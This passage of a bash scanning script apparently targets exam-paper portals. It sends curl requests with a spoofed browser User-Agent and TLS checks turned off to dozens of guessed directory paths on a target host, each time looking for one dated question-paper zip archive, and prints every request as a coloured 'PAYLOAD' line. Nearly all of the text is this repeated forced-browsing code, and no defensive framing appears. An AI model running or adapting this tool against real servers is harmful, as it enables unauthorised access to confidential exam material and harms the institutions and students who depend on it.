${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
